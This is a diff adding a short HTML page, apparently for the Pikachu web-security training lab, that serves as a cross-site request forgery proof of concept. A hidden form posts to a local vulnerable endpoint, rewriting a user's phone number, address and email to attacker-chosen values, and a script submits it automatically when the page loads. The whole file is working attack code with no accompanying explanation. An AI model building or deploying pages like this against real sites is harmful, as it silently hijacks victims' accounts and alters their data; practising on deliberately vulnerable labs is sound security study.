@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF POST</title></head>
+<body>
+<form id="f" action="http://127.0.0.1:8888/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
+  <input type="hidden" name="sex" value="男">
+  <input type="hidden" name="phonenum" value="12345678901">
+  <input type="hidden" name="add" value="hacked">
+  <input type="hidden" name="email" value="hacker@pikaachu.com">
+  <input type="hidden" name="submit" value="submit">
+</form>
+<!-- <script>document.getElementById("f").submit();</script> -->
+<script>HTMLFormElement.prototype.submit.call(document.getElementById('f'));</script>
+</body>
+</html>
